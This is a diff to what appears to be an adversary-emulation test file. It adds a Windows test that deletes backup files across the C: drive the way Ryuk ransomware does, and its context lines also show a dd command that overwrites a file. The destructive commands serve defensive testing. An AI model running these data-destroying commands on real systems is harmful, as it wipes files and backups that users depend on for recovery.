@@ -88,3 +88,15 @@ atomic_tests:
     name: bash
     command: |
       dd of=#{file_to_overwrite} if=#{overwrite_source}
+
+- name: Windows - Delete Backup Files
+  description: |
+    Deletes backup files in a manner similar to Ryuk ransomware.
+
+  supported_platforms:
+    - windows
+
+  executor:
+    name: command_prompt
+    command: |
+      del /s /f /q c:\*.VHD c:\*.bac c:\*.bak c:\*.wbcat c:\*.bkf c:\Backup*.* c:\backup*.* c:\*.set c:\*.win c:\*.dsk
